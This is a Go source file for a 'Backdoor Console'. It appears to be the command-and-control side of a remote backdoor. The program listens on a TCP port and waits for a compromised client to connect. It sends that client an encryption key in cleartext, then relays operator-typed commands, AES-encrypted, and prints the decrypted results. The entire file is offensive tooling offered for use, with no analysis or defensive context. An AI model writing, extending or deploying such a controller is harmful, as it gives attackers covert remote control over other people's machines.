// Backdoor Console project main.go
package main

import (
	"bufio"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"net"
	"os"
	"strconv"
)

var EncKey string = ""

func main() {
	port := flag.Int("listen", 8080, "Port you want to listen on.")
	flag.Parse()
	fmt.Println("Backdoor Console")
	ln, _ := net.Listen("tcp", ":"+strconv.Itoa(*port))
	fmt.Println("Listening on port: " + strconv.Itoa(*port))
	conn, _ := ln.Accept()
	fmt.Println("Connected to", conn.LocalAddr().String())
	fmt.Println("Generating encryption key...")
	key, _ := generateRandomString(23)
	EncKey = key
	fmt.Println("Exchanging encryption key...")
	conn.Write([]byte("KEY:" + EncKey + "KEY:\n"))
	fmt.Println("Connection Secure.")
	fmt.Println("")
	for {
		fmt.Print("Command-> ")
		scan := bufio.NewScanner(os.Stdin)
		scan.Scan()
		conn.Write([]byte(encrypt([]byte(EncKey), scan.Text()) + "\n"))
		fmt.Println("")
		message, _ := bufio.NewReader(conn).ReadString('\n')
		if len(message) >= 1 {
			fmt.Println(decrypt([]byte(EncKey), string(message)))
		} else {
			fmt.Println("Connection to client lost.")
			os.Exit(0)
		}
	}
}

func generateRandomBytes(n int) ([]byte, error) {
	b := make([]byte, n)
	_, err := rand.Read(b)
	if err != nil {
		return nil, err
	}
	return b, nil
}

func generateRandomString(s int) (string, error) {
	b, err := generateRandomBytes(s)
	return base64.URLEncoding.EncodeToString(b), err
}

func encrypt(key []byte, text string) string {
	plaintext := []byte(text)
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
	iv := ciphertext[:aes.BlockSize]
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		panic(err)
	}
	stream := cipher.NewCFBEncrypter(block, iv)
	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
	return base64.URLEncoding.EncodeToString(ciphertext)
}

func decrypt(key []byte, cryptoText string) string {
	ciphertext, _ := base64.URLEncoding.DecodeString(cryptoText)
	block, err := aes.NewCipher(key)
	if err != nil {
		panic(err)
	}
	if len(ciphertext) < aes.BlockSize {
		panic("Ciphertext too short")
	}
	iv := ciphertext[:aes.BlockSize]
	ciphertext = ciphertext[aes.BlockSize:]
	stream := cipher.NewCFBDecrypter(block, iv)
	stream.XORKeyStream(ciphertext, ciphertext)
	return fmt.Sprintf("%s", ciphertext)
}
